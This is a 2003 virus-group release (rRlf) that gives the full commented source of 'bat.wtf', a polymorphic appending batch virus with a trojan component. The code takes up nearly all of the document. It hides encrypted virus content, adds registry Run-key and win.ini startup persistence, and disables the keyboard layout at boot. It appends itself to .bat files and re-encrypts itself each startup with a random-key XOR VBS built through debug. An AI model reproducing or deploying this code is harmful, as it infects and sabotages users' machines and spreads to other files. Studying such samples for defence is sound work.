     +-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=+
    /  bat.wtf by philet0ast3r [rRlf]  /
   +=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+

                  010101
                 10010001  00     001101001
                 00    01  11    01110011010
                 01    11  00    00       11
                 10   010  10    11       00
       100100110101100010  00    00       10
    0100011100100101011    01    01      01
  01010          01        101100110001010
 0101          01100010    11001001010001
  1001       01011000110         10
    010      100 10   0110       01
     110   011   01     0001     11
      011 010    01       0100   00
       0110      10         1010 10
        10       00           01101
        00       11              01

             www.rRlf.de


Here we go again, batch freaks.
This virus (yes, its really a virus ... a great appending bat-infector)
shows a new polymorphic encryption technique for batch.
Besides that there is nothing really interesting in this virus/trojan.

philet0ast3r would like to greet/thank some important persons:
3ri5, tanja, ina, janine, phily, rastafarie, jackie, gl_st0rm, Toro, breathe,
alcopaul, NeKr0, Slage Hammer, Necronomikon, BeLiAL, malfunction, Mindjuice,
and the rest of the rRlf.

Here is the code of the virus, with some comments:

=====[begin code]===============================================================
@echo off

:: bat.wtf
:: by philet0ast3r [rRlf]
:: to show a completly different polymorphic technique for batch
:: finished: 04.05.2003, 13:45:35

ctty nul
if exist c:\ww goto i
echo Çâäïè§èááŠäóóþ§éòëŠîá§éèó§âÿîôó§ôéã©ïëá§àèóè§âéãŠâäïè§â§·¶··§³·§±²§±´§±¿§±Á§µ·§±Á§±±§±±§·Ã§·Æ§´Æ§°µ§·Ã§·Æ§°±¹õŠâäïè§â§·¶¶·§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³§µ·§µµ§µÄ§´¶¹¹õŠâäïè§â§·¶µ·§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á§°³§µ·§±²§°µ¹¹õŠâäïè§â§·¶´·§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·¹¹õŠâäïè§â§·¶³·§´¶§·Ã§·Æ§°±§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³¹¹õŠâäïè§â§·¶²·§µ·§µµ§µÄ§´µ§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á¹¹õŠâäïè§â§·¶±·§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°¹¹õŠâäïè§â§·¶°·§±Á§°³§±Á§µ·§´¶§·Ã§·Æ§°±§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä¹¹õŠâäïè§â§·¶¿·§±±§±¾§±Â§±³§µ·§µµ§µÄ§´´§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾¹¹õŠâäïè§â§·¶¾·§±±§µ·§±Â§±Á§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä¹¹õŠâäïè§â§·¶Æ·§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·§´¶§·Ã§·Æ§°±§±²§°µ§°Ä§°³¹¹õŠâäïè§â§·¶Å·§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³§µ·§µµ§µÄ§´³§µµ§´Â§±Â§°²¹¹õŠâäïè§â§·¶Ä·§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä¹¹õŠâäïè§â§·¶Ã·§±²§°±§±²§±Ä§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·§´µ§·Ã§·Æ§°±¹¹õŠ>i
echo Šâäïè§â§·¶Â·§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³§µ·§µµ§µÄ§´²¹¹õŠâäïè§â§·¶Á·§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á§°³§µ·§±²§°µ¹¹õŠâäïè§â§·µ··§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·¹¹õŠâäïè§â§·µ¶·§´µ§·Ã§·Æ§°±§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³¹¹õŠâäïè§â§·µµ·§µ·§µµ§µÄ§´±§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á¹¹õŠâäïè§â§·µ´·§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°¹¹õŠâäïè§â§·µ³·§±Á§°³§±Á§µ·§´µ§·Ã§·Æ§°±§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä¹¹õŠâäïè§â§·µ²·§±±§±¾§±Â§±³§µ·§µµ§µÄ§´°§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾¹¹õŠâäïè§â§·µ±·§±±§µ·§±Â§±Á§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä¹¹õŠâäïè§â§·µ°·§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·§´´§·Ã§·Æ§°±§±²§°µ§°Ä§°³¹¹õŠâäïè§â§·µ¿·§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³§µ·§µµ§µÄ§´¿§µµ§´Â§±Â§°²¹¹õŠâäïè§â§·µ¾·§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä¹¹õŠâäïè§â§·µÆ·§±²§°±§±²§±Ä§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·§´´§·Ã§·Æ§°±¹¹õŠâäïè§â§·µÅ·§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³§µ·§µµ§µÄ§´¾¹¹õŠ>>i
echo Šâäïè§â§·µÄ·§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á§°³§µ·§±²§°µ¹¹õŠâäïè§â§·µÃ·§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°§±Á§°³§±Á§µ·¹¹õŠâäïè§â§·µÂ·§´´§·Ã§·Æ§°±§±²§°µ§°Ä§°³§±¾§±Ã§±²§°Ä§±±§±¾§±Â§±³¹¹õŠâäïè§â§·µÁ·§µ·§µµ§µÄ§´·§µµ§´Â§±Â§°²§±Ä§·Ã§·Æ§±¾§±±§µ·§±Â§±Á¹¹õŠâäïè§â§·´··§°³§µ·§±²§°µ§°µ§±Á§°µ§±Ä§±²§°±§±²§±Ä§µ·§´¶§µ·§±°¹¹õŠâäïè§â§·´¶·§±Á§°³§±Á§µ·§°µ§·Ã§·Æ§±°§±Á§°³§±Á§µ·§°µ§·Ã§·Æ§´Æ¹¹õŠâäïè§â§·´µ·§´¶§·Ã§·Æ§±²§±´§±¿§±Á§µ·§µÂ§´Â§´¶§µÂ§°µ§°µ§·Ã§·Æ¹¹õŠâäïè§â§·´´·§±°§±Á§°³§±Á§µ·§±³§·Ã§·Æ§´Æ§´µ§·Ã§·Æ§±²§±´§±¿§±Á¹¹õŠâäïè§â§·´³·§µ·§µÂ§´Â§´µ§µÂ§°µ§°µ§·Ã§·Æ§±°§±Á§°³§±Á§µ·§±³§·Ã¹¹õŠâäïè§â§·´²·§·Æ§´Æ§´´§·Ã§·Æ§±²§±´§±¿§±Á§µ·§µÂ§´Â§´´§µÂ§°µ§°µ¹¹õŠâäïè§â§·´±·§·Ã§·Æ§´Æ§±³§·Ã§·Æ§Ã°¹¹õŠâäïè§õäÿ¹¹õŠâäïè§·µ±±¹¹õŠâäïè§é§õ©åæó¹¹õŠâäïè§ð¹¹õŠâäïè§ö¹¹õŠãâåòà»õŠãâë§õŠâäïè§Çâäïè§èáá¹·Šâäïè§äæëë§õ©åæó¹¹·Šâäïè§îá§âÿîôó§¶©õõ§âäïè§åæó©ðóá½§Ïèð§æõâ§þèò¸¹¹·Šâäïè§îá§âÿîôó§µ©õõ§âäïè§åæó©ðóá½§Ðïæó§æõâ§þèò§ãèîéà¸¹¹·Šâäïè§îá§âÿîôó§´©õõ§âäïè§åæó©ðóá½§Ïèð§æõâ§óïîéàô§ðîóï§þèò¸¹¹·Šâäïè§ãâë§­©õõ¹¹·Š>>i
echo Šâäïè§äïèîäâ§¨ä½©§¨é§¨ó½©«·µ¹¹·Šâäïè§äæëë§æ©åæó¹¹·Šõâé§·§·©åæóŠâäïè§Çâäïè§èáá¹åŠâäïè§äæëë§õ©åæó¹¹åŠâäïè§îá§âÿîôó§¶©õõ§âäïè§åæó©ðóá½§Î ê§áîéâ«§óïæéìô©¹¹åŠâäïè§îá§âÿîôó§µ©õõ§âäïè§åæó©ðóá½§Þâæï«§îó ô§õâæëëþ§åèõîéà§ïâõâ©¹¹åŠâäïè§îá§âÿîôó§´©õõ§âäïè§åæó©ðóá½§Î ê§èì§©©©§Î§íòôó§àèó§óèè§êæéþ§åòàô§¯íèìâ§¼®©¹¹åŠâäïè§ãâë§­©õõ¹¹åŠâäïè§äïèîäâ§¨ä½©§¨é§¨ó½©«·µ¹¹åŠâäïè§äæëë§ä©åæó¹¹åŠõâé§å§å©åæóŠâäïè§Çâäïè§èáá¹ãŠâäïè§äæëë§õ©åæó¹¹ãŠâäïè§îá§âÿîôó§¶©õõ§âäïè§åæó©ðóá½§Éè«§Î§ãîãé ó§ïæñâ§æéþ§÷õèåëâêô©§Þèò¸¹¹ãŠâäïè§îá§âÿîôó§µ©õõ§âäïè§åæó©ðóá½§Î§ãîãé ó§ôââ§æéþ©§Ëæêâ§÷õèóâäóîèé©§Ãîã§þèò§ïæñâ§æéþ§÷õèåëâêô¸¹¹ãŠâäïè§îá§âÿîôó§´©õõ§âäïè§åæó©ðóá½§Î§êâó§ôèêâ§õâäâéóëþ©§Åòó§Î§ïæñâ§åâæóâé§óïâ§ôïîó§èòó§èá§îó§½Ú§Æéã§þèò¸¹¹ãŠâäïè§ãâë§­©õõ¹¹ãŠâäïè§äïèîäâ§¨ä½©§¨é§¨ó½©«·µ¹¹ãŠâäïè§äæëë§â©åæó¹¹ãŠõâé§ã§ã©åæóŠâäïè§Çâäïè§èáá¹áŠâäïè§äæëë§õ©åæó¹¹áŠâäïè§îá§âÿîôó§¶©õõ§âäïè§åæó©ðóá½§Î ê§àèîéà§óè§àâó§êâ§ôèêâ§ãõòàô§éèð©¹¹áŠâäïè§îá§âÿîôó§µ©õõ§âäïè§åæó©ðóá½§Î§ðæéó§ôâÿ¦¹¹áŠ>>i
echo Šâäïè§îá§âÿîôó§´©õõ§âäïè§åæó©ðóá½§Àèó§óè§àâó§ôèêâóïîéà§óè§âæó§½®¹¹áŠâäïè§ãâë§­©õõ¹¹áŠâäïè§äïèîäâ§¨ä½©§¨é§¨ó½©«·µ¹¹áŠâäïè§äæëë§à©åæó¹¹áŠõâé§á§á©åæóŠâäïè§Çâäïè§èáá¹ïŠâäïè§äæëë§õ©åæó¹¹ïŠâäïè§îá§âÿîôó§¶©õõ§âäïè§åæó©ðóá½§Èì«§òéóîë§óïâé©¹¹ïŠâäïè§îá§âÿîôó§µ©õõ§âäïè§åæó©ðóá½§Éîäâ§óæëìîéà§óè§þèò«§ôââ§þèò§æõèòéã©¹¹ïŠâäïè§îá§âÿîôó§´©õõ§âäïè§åæó©ðóá½§Èì«§åþâ©§Óæìâ§äæõâ©¹¹ïŠâäïè§ãâë§­©õõ¹¹ïŠâäïè§äïèîäâ§¨ä½©§¨é§¨ó½©«·µ¹¹ïŠâäïè§äæëë§î©åæó¹¹ïŠõâé§ï§ï©åæóŠäóóþ§äèéŠâäïè©Šâäïè§åæó©ðóá½§Ïâþ§åæó©µéãÏæëá«§äæé§þèò§ïâæõ§êâ¸Šâäïè§åæó©ðóá½§Ãîãé ó§âÿ÷âäó§óè§êââó§þèò§ïâõâ©Šäïèîäâ§¨ä½©§¨é§¨ó½©«·µŠäóóþ§éòëŠãâë§ôóæõó©åæóŠõâé§ôéã©ïëá§ôóæõó©åæóŠäæëë§ôóæõó©åæóŠ½âéãŠäóóþ§éòëŠ½½>>i
move i c:\ww

:: Junk, isn't it?

:i
if exist %winbootdir%\system\pm.bat goto v

:: if the trojan-question has already been answered with 3,
:: the question-part is jumped over

ctty con
echo What the fuck is this?
echo (1) Fuck off, asshole!
echo (2) Polymorphic batch worm.
echo (3) (this is the wrong answer) ... sure?
choice /c:123 /n
if errorlevel 1 set j=pl
if errorlevel 2 set j=d
if errorlevel 3 set j=r
cls
ctty nul
goto %j%

:: the interactive "trojan" part

:d
del %0

:: if the answer is 2, nothing happens

:pl
echo REGEDIT4>pl.reg
echo [hkey_local_machine\software\microsoft\windows\currentversion\run]>>pl.reg
echo "y0ur fault"="c:\\pl.bat">>pl.reg
regedit /s pl.reg
echo @echo off>c:\pl.bat
echo ctty nul>>c:\pl.bat
echo c:\windows\rundll32.exe user,disableoemlayer>>c:\pl.bat
del pl.reg
del %0

:: if the answer is 1, windows gets "fucked off" at every start

:r
if exist %winbootdir%\system\pm.bat goto v
copy %0 c:\bat.wtf.bat

:: if the answer is 3, the virus-part gets executed

echo e 0100 40 65 63 68 6F 20 6F 66 66 0D 0A 3A 72 0D 0A 76>pb
echo e 0110 65 72 7C 74 69 6D 65 7C 66 69 6E 64 20 22 2C 31>>pb
echo e 0120 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F 74 20 65 72>>pb
echo e 0130 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>pb
echo e 0140 31 0D 0A 76 65 72 7C 74 69 6D 65 7C 66 69 6E 64>>pb
echo e 0150 20 22 2C 32 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F>>pb
echo e 0160 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67>>pb
echo e 0170 6F 74 6F 20 32 0D 0A 76 65 72 7C 74 69 6D 65 7C>>pb
echo e 0180 66 69 6E 64 20 22 2C 33 22 3E 6E 75 6C 0D 0A 69>>pb
echo e 0190 66 20 6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C>>pb
echo e 01A0 20 31 20 67 6F 74 6F 20 33 0D 0A 76 65 72 7C 74>>pb
echo e 01B0 69 6D 65 7C 66 69 6E 64 20 22 2C 34 22 3E 6E 75>>pb
echo e 01C0 6C 0D 0A 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C>>pb
echo e 01D0 65 76 65 6C 20 31 20 67 6F 74 6F 20 34 0D 0A 76>>pb
echo e 01E0 65 72 7C 74 69 6D 65 7C 66 69 6E 64 20 22 2C 35>>pb
echo e 01F0 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F 74 20 65 72>>pb
echo e 0200 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>pb
echo e 0210 35 0D 0A 76 65 72 7C 74 69 6D 65 7C 66 69 6E 64>>pb
echo e 0220 20 22 2C 36 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F>>pb
echo e 0230 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67>>pb
echo e 0240 6F 74 6F 20 36 0D 0A 76 65 72 7C 74 69 6D 65 7C>>pb
echo e 0250 66 69 6E 64 20 22 2C 37 22 3E 6E 75 6C 0D 0A 69>>pb
echo e 0260 66 20 6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C>>pb
echo e 0270 20 31 20 67 6F 74 6F 20 37 0D 0A 76 65 72 7C 74>>pb
echo e 0280 69 6D 65 7C 66 69 6E 64 20 22 2C 38 22 3E 6E 75>>pb
echo e 0290 6C 0D 0A 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C>>pb
echo e 02A0 65 76 65 6C 20 31 20 67 6F 74 6F 20 38 0D 0A 76>>pb
echo e 02B0 65 72 7C 74 69 6D 65 7C 66 69 6E 64 20 22 2C 39>>pb
echo e 02C0 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F 74 20 65 72>>pb
echo e 02D0 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>pb
echo e 02E0 39 0D 0A 76 65 72 7C 74 69 6D 65 7C 66 69 6E 64>>pb
echo e 02F0 20 22 2C 30 22 3E 6E 75 6C 0D 0A 69 66 20 6E 6F>>pb
echo e 0300 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67>>pb
echo e 0310 6F 74 6F 20 30 0D 0A 67 6F 74 6F 20 72 0D 0A 3A>>pb
echo e 0320 30 0D 0A 73 65 74 20 5D 3D 30 0D 0A 67 6F 74 6F>>pb
echo e 0330 20 61 0D 0A 3A 39 0D 0A 73 65 74 20 5D 3D 39 0D>>pb
echo e 0340 0A 67 6F 74 6F 20 61 0D 0A 3A 38 0D 0A 73 65 74>>pb
echo e 0350 20 5D 3D 38 0D 0A 67 6F 74 6F 20 61 0D 0A 3A 37>>pb
echo e 0360 0D 0A 73 65 74 20 5D 3D 37 0D 0A 67 6F 74 6F 20>>pb
echo e 0370 61 0D 0A 3A 36 0D 0A 73 65 74 20 5D 3D 36 0D 0A>>pb
echo e 0380 67 6F 74 6F 20 61 0D 0A 3A 35 0D 0A 73 65 74 20>>pb
echo e 0390 5D 3D 35 0D 0A 67 6F 74 6F 20 61 0D 0A 3A 34 0D>>pb
echo e 03A0 0A 73 65 74 20 5D 3D 34 0D 0A 67 6F 74 6F 20 61>>pb
echo e 03B0 0D 0A 3A 33 0D 0A 73 65 74 20 5D 3D 33 0D 0A 67>>pb
echo e 03C0 6F 74 6F 20 61 0D 0A 3A 32 0D 0A 73 65 74 20 5D>>pb
echo e 03D0 3D 32 0D 0A 67 6F 74 6F 20 61 0D 0A 3A 31 0D 0A>>pb
echo e 03E0 73 65 74 20 5D 3D 31 0D 0A 3A 61 0D 0A 69 66 20>>pb
echo e 03F0 6E 6F 74 20 65 78 69 73 74 20 62 2E 72 72 20 67>>pb
echo e 0400 6F 74 6F 20 62 0D 0A 69 66 20 6E 6F 74 20 65 78>>pb
echo e 0410 69 73 74 20 63 2E 72 72 20 67 6F 74 6F 20 63 0D>>pb
echo e 0420 0A 67 6F 74 6F 20 64 0D 0A 3A 62 0D 0A 73 65 74>>pb
echo e 0430 20 3A 3D 25 5D 25 0D 0A 73 65 74 20 5D 3D 0D 0A>>pb
echo e 0440 65 63 68 6F 2E 3E 62 2E 72 72 0D 0A 67 6F 74 6F>>pb
echo e 0450 20 72 0D 0A 3A 63 0D 0A 73 65 74 20 2D 3D 25 5D>>pb
echo e 0460 25 0D 0A 73 65 74 20 5D 3D 0D 0A 65 63 68 6F 2E>>pb
echo e 0470 3E 63 2E 72 72 0D 0A 67 6F 74 6F 20 72 0D 0A 3A>>pb
echo e 0480 64 0D 0A 64 65 6C 20 2A 2E 72 72 0D 0A 65 63 68>>pb
echo e 0490 6F 2E 6F 6E 20 65 72 72 6F 72 20 72 65 73 75 6D>>pb
echo e 04A0 65 20 6E 65 78 74 3E 70 0D 0A 65 63 68 6F 20 73>>pb
echo e 04B0 65 74 20 66 73 6F 20 3D 20 63 72 65 61 74 65 6F>>pb
echo e 04C0 62 6A 65 63 74 28 22 73 63 72 69 70 74 69 6E 67>>pb
echo e 04D0 2E 66 69 6C 65 73 79 73 74 65 6D 6F 62 6A 65 63>>pb
echo e 04E0 74 22 29 3E 3E 70 0D 0A 65 63 68 6F 20 73 65 74>>pb
echo e 04F0 20 70 72 6F 63 34 20 3D 20 66 73 6F 2E 6F 70 65>>pb
echo e 0500 6E 74 65 78 74 66 69 6C 65 28 22 63 3A 5C 62 61>>pb
echo e 0510 74 2E 77 74 66 2E 62 61 74 22 2C 20 31 29 3E 3E>>pb
echo e 0520 70 0D 0A 65 63 68 6F 20 6D 73 67 20 3D 20 70 72>>pb
echo e 0530 6F 63 34 2E 72 65 61 64 61 6C 6C 3E 3E 70 0D 0A>>pb
echo e 0540 65 63 68 6F 20 64 64 64 20 3D 20 78 28 6D 73 67>>pb
echo e 0550 29 3E 3E 70 0D 0A 65 63 68 6F 20 73 65 74 20 70>>pb
echo e 0560 72 6F 63 32 20 3D 20 66 73 6F 2E 63 72 65 61 74>>pb
echo e 0570 65 74 65 78 74 66 69 6C 65 28 22 63 3A 5C 62 61>>pb
echo e 0580 74 2E 77 74 66 2E 62 61 74 22 2C 20 74 72 75 65>>pb
echo e 0590 29 3E 3E 70 0D 0A 65 63 68 6F 20 70 72 6F 63 32>>pb
echo e 05A0 2E 77 72 69 74 65 6C 69 6E 65 20 64 64 64 3E 3E>>pb
echo e 05B0 70 0D 0A 65 63 68 6F 20 70 72 6F 63 32 2E 63 6C>>pb
echo e 05C0 6F 73 65 3E 3E 70 0D 0A 65 63 68 6F 20 46 75 6E>>pb
echo e 05D0 63 74 69 6F 6E 20 78 28 73 54 65 78 74 29 3E 3E>>pb
echo e 05E0 70 0D 0A 65 63 68 6F 2E 4F 6E 20 45 72 72 6F 72>>pb
echo e 05F0 20 52 65 73 75 6D 65 20 4E 65 78 74 3E 3E 70 0D>>pb
echo e 0600 0A 65 63 68 6F 20 44 69 6D 20 65 6B 65 79 2C 20>>pb
echo e 0610 69 2C 20 68 61 73 68 2C 20 63 72 62 79 74 65 3E>>pb
echo e 0620 3E 70 0D 0A 65 63 68 6F 20 65 6B 65 79 20 3D 20>>pb
echo e 0630 25 3A 25 25 2D 25 25 5D 25 3E 3E 70 0D 0A 65 63>>pb
echo e 0640 68 6F 20 46 6F 72 20 69 20 3D 20 31 20 54 6F 20>>pb
echo e 0650 4C 65 6E 28 73 54 65 78 74 29 3E 3E 70 0D 0A 65>>pb
echo e 0660 63 68 6F 20 68 61 73 68 20 3D 20 41 73 63 28 4D>>pb
echo e 0670 69 64 28 73 54 65 78 74 2C 20 69 2C 20 31 29 29>>pb
echo e 0680 3E 3E 70 0D 0A 65 63 68 6F 20 63 72 62 79 74 65>>pb
echo e 0690 20 3D 20 43 68 72 28 68 61 73 68 20 58 6F 72 20>>pb
echo e 06A0 28 65 6B 65 79 20 4D 6F 64 20 32 35 35 29 29 3E>>pb
echo e 06B0 3E 70 0D 0A 65 63 68 6F 20 78 20 3D 20 78 20 26>>pb
echo e 06C0 20 63 72 62 79 74 65 3E 3E 70 0D 0A 65 63 68 6F>>pb
echo e 06D0 20 4E 65 78 74 3E 3E 70 0D 0A 65 63 68 6F 20 45>>pb
echo e 06E0 6E 64 20 46 75 6E 63 74 69 6F 6E 3E 3E 70 0D 0A>>pb
echo e 06F0 63 74 74 79 20 6E 75 6C 0D 0A 6D 6F 76 65 20 70>>pb
echo e 0700 20 25 77 69 6E 62 6F 6F 74 64 69 72 25 5C 70 6D>>pb
echo e 0710 2E 76 62 73>>pb
echo rcx>>pb
echo 0614>>pb
echo n pm.bat>>pb
echo w>>pb
echo q>>pb
debug<pb
del pb
move pm.bat %winbootdir%\system
start /m /w %winbootdir%\system\pm.bat

:: this is the debug-script of the batch that is used
:: to generate a de/encryption-vbs with random key
:: code see below

:v
del %winbootdir%\de.vbs

:: if not first generation: deletes the old decryption-vbs

echo [windows]>i
echo load=%winbootdir%\system\ftw.bat>>i
echo run=>>i
echo NullPort=None>>i
echo.>>i
copy i + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del i

:: some lines are added to the win.ini, for start-up-reasons

echo @echo off>i
echo ctty nul>>i
echo ren %winbootdir%\pm.vbs de.vbs>>i
echo start /m /w %winbootdir%\system\pm.bat>>i
echo start /w %winbootdir%\de.vbs>>i
echo start c:\bat.wtf.bat>>i
move i %winbootdir%\system\ftw.bat

:: this is the file that gets executed at every-system start
:: it generates a new de/encryption-vbs
:: the old one is used to decrypt the virus
:: the now decrypted virus is executed
:: it encrypts itself at the end with the new de/encryption-vbs

for %%r in (%winbootdir%\*.bat) do set R=%%r
copy %R% + %0

:: this is the fantastic infection part :)

start %winbootdir%\pm.vbs
:end
=====[end code]=================================================================

Ok, and here is the code of the batch that is used to generate
the de/encryption-vbs-files with random keys (again with comments):

=====[begin code]===============================================================
@echo off
:r
ver|time|find ",1">nul
if not errorlevel 1 goto 1
ver|time|find ",2">nul
if not errorlevel 1 goto 2
ver|time|find ",3">nul
if not errorlevel 1 goto 3
ver|time|find ",4">nul
if not errorlevel 1 goto 4
ver|time|find ",5">nul
if not errorlevel 1 goto 5
ver|time|find ",6">nul
if not errorlevel 1 goto 6
ver|time|find ",7">nul
if not errorlevel 1 goto 7
ver|time|find ",8">nul
if not errorlevel 1 goto 8
ver|time|find ",9">nul
if not errorlevel 1 goto 9
ver|time|find ",0">nul
if not errorlevel 1 goto 0
goto r
:0
set ]=0
goto a
:9
set ]=9
goto a
:8
set ]=8
goto a
:7
set ]=7
goto a
:6
set ]=6
goto a
:5
set ]=5
goto a
:4
set ]=4
goto a
:3
set ]=3
goto a
:2
set ]=2
goto a
:1
set ]=1
:a
if not exist b.rr goto b
if not exist c.rr goto c
goto d
:b
set :=%]%
set ]=
echo.>b.rr
goto r
:c
set -=%]%
set ]=
echo.>c.rr
goto r
:d
del *.rr

:: the technique of my "Batch Random Number Generator v2.0" is used to
:: get three random numbers, used as key in the de/encryption-vbs

echo.on error resume next>p
echo set fso = createobject("scripting.filesystemobject")>>p
echo set proc4 = fso.opentextfile("c:\bat.wtf.bat", 1)>>p
echo msg = proc4.readall>>p
echo ddd = x(msg)>>p
echo set proc2 = fso.createtextfile("c:\bat.wtf.bat", true)>>p
echo proc2.writeline ddd>>p
echo proc2.close>>p
echo Function x(sText)>>p
echo.On Error Resume Next>>p
echo Dim ekey, i, hash, crbyte>>p
echo ekey = %:%%-%%]%>>p

:: here the three random numbers get inserted into the de/encryption-vbs

echo For i = 1 To Len(sText)>>p
echo hash = Asc(Mid(sText, i, 1))>>p
echo crbyte = Chr(hash Xor (ekey Mod 255))>>p
echo x = x & crbyte>>p
echo Next>>p
echo End Function>>p
ctty nul
move p %winbootdir%\pm.vbs
=====[end code]=================================================================

That's all, ppl. I hope this enjoyed you a bit.
Nevermind if it didn't. I don't, too.
Remember: Batch is in no way dead yet...

Something you want to tell me? ... No matter what:
philet0ast3r@rRlf.de
www.rRlf.de